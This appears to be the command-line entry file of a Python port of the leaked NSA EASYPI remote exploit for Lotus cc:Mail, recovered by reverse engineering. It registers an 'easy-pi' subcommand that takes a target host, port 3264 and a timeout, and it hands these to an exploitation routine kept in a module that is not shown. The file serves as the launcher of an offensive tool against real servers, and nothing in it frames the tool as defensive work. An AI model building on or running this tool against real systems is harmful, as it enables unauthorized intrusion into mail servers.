"""easy-pi — EASYPI Lotus cc:Mail 远程利用。

Python 重写的 NSA Easypi 工具 `Easypi-3.1.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 cc:Mail 利用流程。
"""

from . import easy_pi


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def easy_pi_handle(args):
    """Run the EASYPI exploitation sequence against the supplied host."""
    return easy_pi.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `easy-pi` subcommand on an argparse
    subparsers group."""
    p = subparsers.add_parser(
        "easy-pi",
        help="EASYPI Lotus cc:Mail 远程利用",
        description="Python 重写的 NSA Easypi (EASYPI) Lotus cc:Mail "
                    "远程利用工具 Easypi-3.1.0。通过 TCP 连接执行远程利用。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=3264,
        help="目标 cc:Mail 端口（默认 3264）",
    )
    p.add_argument(
        "--timeout", type=int, default=180,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 180）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=easy_pi_handle)
